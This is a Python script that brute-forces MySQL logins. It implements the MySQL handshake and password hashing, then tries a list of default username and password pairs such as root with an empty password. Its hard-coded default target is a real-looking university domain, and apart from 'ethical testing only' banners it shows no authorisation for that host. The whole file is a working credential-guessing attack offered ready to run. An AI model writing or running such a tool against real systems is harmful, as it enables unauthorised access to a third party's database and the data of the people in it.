#!/usr/bin/env python3
"""
MySQL Credential Testing
Tests common default credentials (ethical testing only)
"""
import socket
import struct
import hashlib
import sys

def mysql_native_password(password, salt):
    """Generate MySQL native password hash"""
    if not password:
        return b''
    
    stage1 = hashlib.sha1(password.encode()).digest()
    stage2 = hashlib.sha1(stage1).digest()
    stage3 = hashlib.sha1(salt + stage2).digest()
    
    return bytes(a ^ b for a, b in zip(stage1, stage3))

def try_mysql_login(host, port, username, password):
    """Attempt MySQL login with credentials"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # Receive server greeting
        greeting = sock.recv(1024)
        
        if len(greeting) < 10:
            sock.close()
            return False, "Invalid greeting"
        
        # Parse greeting packet
        protocol_version = greeting[4]
        version_end = greeting.index(b'\x00', 5)
        server_version = greeting[5:version_end].decode('utf-8', errors='ignore')
        
        # Extract salt (auth challenge)
        salt_start = version_end + 5
        salt_part1 = greeting[salt_start:salt_start + 8]
        
        # Find second part of salt
        capabilities_pos = salt_start + 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
        salt_part2_start = capabilities_pos
        salt_part2_end = greeting.index(b'\x00', salt_part2_start)
        salt_part2 = greeting[salt_part2_start:salt_part2_end]
        
        salt = salt_part1 + salt_part2
        
        # Build login packet
        capabilities = 0xa285  # CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION
        max_packet = 0x01000000
        charset = 33  # utf8_general_ci
        
        # Generate auth response
        auth_response = mysql_native_password(password, salt)
        
        # Build packet
        packet = struct.pack('<I', capabilities)
        packet += struct.pack('<I', max_packet)
        packet += struct.pack('<B', charset)
        packet += b'\x00' * 23  # filler
        packet += username.encode() + b'\x00'
        packet += struct.pack('<B', len(auth_response)) + auth_response
        
        # Send login packet
        packet_length = len(packet)
        header = struct.pack('<I', packet_length)[0:3] + b'\x01'
        sock.send(header + packet)
        
        # Receive response
        response = sock.recv(1024)
        
        sock.close()
        
        if len(response) > 4:
            packet_type = response[4]
            
            if packet_type == 0x00:  # OK packet
                return True, "Login successful!"
            elif packet_type == 0xff:  # ERR packet
                error_code = struct.unpack('<H', response[5:7])[0]
                error_msg = response[9:].decode('utf-8', errors='ignore')
                return False, f"Error {error_code}: {error_msg}"
            else:
                return False, f"Unknown response: {packet_type}"
        
        return False, "No response"
        
    except Exception as e:
        return False, str(e)

def test_common_credentials(host, port=3306):
    """Test common default MySQL credentials"""
    print(f"[*] Testing common credentials on {host}:{port}")
    print(f"[!] This is for ethical security testing only!")
    print()
    
    # Common default credentials (very limited list for ethical testing)
    credentials = [
        ('root', ''),
        ('root', 'root'),
        ('root', 'password'),
        ('root', '123456'),
        ('admin', ''),
        ('admin', 'admin'),
        ('mysql', ''),
        ('mysql', 'mysql'),
        ('test', 'test'),
        ('user', 'user'),
    ]
    
    found = False
    
    for username, password in credentials:
        display_pass = password if password else '(empty)'
        print(f"[*] Trying: {username} / {display_pass}", end='')
        
        success, message = try_mysql_login(host, port, username, password)
        
        if success:
            print(f" ✓")
            print(f"\n[!!!] CRITICAL: Valid credentials found!")
            print(f"[!!!] Username: {username}")
            print(f"[!!!] Password: {display_pass}")
            print(f"[!!!] This is a CRITICAL vulnerability!")
            print(f"[!!!] Database is fully compromised!")
            found = True
            break
        else:
            print(f" ✗ ({message[:50]})")
    
    return found

if __name__ == "__main__":
    host = "csbc.sanjivaniuniversity.com"
    if len(sys.argv) > 1:
        host = sys.argv[1]
    
    print("="*60)
    print("MySQL Credential Brute Force Test")
    print("="*60)
    print()
    
    result = test_common_credentials(host)
    
    print("\n" + "="*60)
    if result:
        print("RESULT: CRITICAL - Weak credentials found!")
        print("Database is fully compromised!")
    else:
        print("RESULT: No common credentials found")
        print("Database requires strong authentication")
    print("="*60)
